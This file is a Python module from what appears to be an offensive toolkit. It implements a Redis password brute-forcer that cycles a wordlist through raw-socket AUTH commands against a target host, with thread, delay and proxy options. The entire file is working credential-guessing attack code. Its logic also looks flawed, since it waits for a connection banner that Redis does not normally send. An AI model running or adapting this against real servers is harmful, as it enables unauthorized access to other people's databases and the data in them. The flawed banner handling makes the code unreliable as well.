"""Redis brute-force module."""

import socket
from inf3rno.core.bruteforce import BaseBrute


class RedisBrute(BaseBrute):
    """Redis brute-force implementation (AUTH command)."""

    def __init__(self, target: str, port: int = 6379, username: str = "default",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "Redis"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt Redis AUTH login."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))

            # Receive banner
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            # Check if Redis requires AUTH
            if "NOAUTH" not in banner and "Authentication required" not in banner:
                # Try AUTH anyway
                pass

            # Send AUTH command (Redis protocol: *2\r\n$4\r\nAUTH\r\n$<len>\r\n<password>\r\n)
            auth_cmd = f"*2\r\n$4\r\nAUTH\r\n${len(password)}\r\n{password}\r\n"
            sock.send(auth_cmd.encode())

            # Receive response
            response = sock.recv(1024).decode("utf-8", errors="ignore").strip()

            if response.startswith("+OK"):
                return True
            elif response.startswith("-ERR"):
                return False
            else:
                return False

        except socket.timeout:
            if self.verbose:
                print(f"[!] Redis timeout for {password}")
            return False
        except ConnectionRefusedError:
            if self.verbose:
                print(f"[!] Redis connection refused")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] Redis error: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
